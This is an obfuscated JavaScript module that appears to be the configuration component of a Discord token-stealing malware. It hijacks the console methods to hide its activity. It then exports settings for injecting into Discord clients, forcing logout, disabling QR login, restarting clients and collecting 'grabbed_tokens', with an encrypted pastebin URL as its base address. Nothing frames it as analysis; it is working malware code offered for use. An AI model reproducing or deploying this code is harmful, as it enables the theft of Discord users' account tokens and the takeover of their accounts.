var _0x4c75ec = (function () {
    var _0x56fb55 = true
    return function (_0x109af5, _0x566a9e) {
      var _0x1806b8 = _0x56fb55
        ? function () {
            if (_0x566a9e) {
              var _0x372cc5 = _0x566a9e.apply(_0x109af5, arguments)
              return (_0x566a9e = null), _0x372cc5
            }
          }
        : function () {}
      return (_0x56fb55 = false), _0x1806b8
    }
  })(),
  _0x10da18 = _0x4c75ec(this, function () {
    var _0x3c34df = function () {
        var _0x4ed859
        try {
          _0x4ed859 = Function(
            'return (function() {}.constructor("return this")( ));'
          )()
        } catch (_0x6e07d6) {
          _0x4ed859 = window
        }
        return _0x4ed859
      },
      _0x432af9 = _0x3c34df()
    var _0x1dfe49 = (_0x432af9.console = _0x432af9.console || {})
    var _0x328d0f = [
      'log',
      'warn',
      'info',
      'error',
      'exception',
      'table',
      'trace',
    ]
    for (var _0x22d37a = 0; _0x22d37a < _0x328d0f.length; _0x22d37a++) {
      var _0x141d2d = _0x4c75ec.constructor.prototype.bind(_0x4c75ec)
      var _0x1c362a = _0x328d0f[_0x22d37a]
      var _0x238e44 = _0x1dfe49[_0x1c362a] || _0x141d2d
      _0x141d2d['__proto__'] = _0x4c75ec.bind(_0x4c75ec)
      _0x141d2d.toString = _0x238e44.toString.bind(_0x238e44)
      _0x1dfe49[_0x1c362a] = _0x141d2d
    }
  })
_0x10da18()
module.exports = (_0x1409f3) => {
  var _0x44a01a = { all: [] }
  return {
    base_url: _0x1409f3.utils.encryption.encryptData(
      'https://pastebin.com/raw/1wVYKU80'
    ),
    instant_logout: true,
    disable_qr_code: true,
    injection_notification: true,
    initialize_notification: true,
    logout_notification: true,
    running_executables: [],
    executables: [],
    files_path: [],
    closed_discord_clients: '',
    restarted_discord_clients: '',
    grabbed_tokens: _0x44a01a,
  }
}
